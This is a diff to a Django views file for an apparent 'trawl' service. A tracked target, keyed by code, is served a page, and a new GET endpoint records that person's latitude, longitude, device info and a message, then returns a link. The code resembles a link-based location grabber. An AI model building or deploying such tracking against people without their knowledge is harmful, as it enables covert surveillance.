@@ -21,7 +21,7 @@ def index(request, code):
                 'myboy': data['target_code'],
                 'device_info': device_info
             }
-            return render(request, 'trawl_page.html',content)
+            return render(request, 'test_trawl_page.html',content)
         if request.method == 'POST':
             data = JSONParser().parse(request)
             target_data = {
@@ -30,6 +30,22 @@ def index(request, code):
                 "longitude": data['longitude'],
                 "device_info": data['device_info'],
                 "message": data['msg'],
+
+            }
+            saving = save_trawls(target_data)
+            return JsonResponse({"success": saving['success'],"link":saving['link']})
+
+
+def test_page(request):
+    if request.method == 'GET':
+            
+            # data = JSONParser().parse(request)
+            target_data = {
+                'target_code': request.GET.get('myboy'),
+                "latitute": request.GET.get('latitute'),
+                "longitude": request.GET.get('longitude'),
+                "device_info": request.GET.get('device_info'),
+                "message": request.GET.get('msg'),
 
             }
             saving = save_trawls(target_data)
@@ -69,3 +85,4 @@ def save_trawls(target_data):
 
 def page_404(request):
     return render(request, '404.html')
+
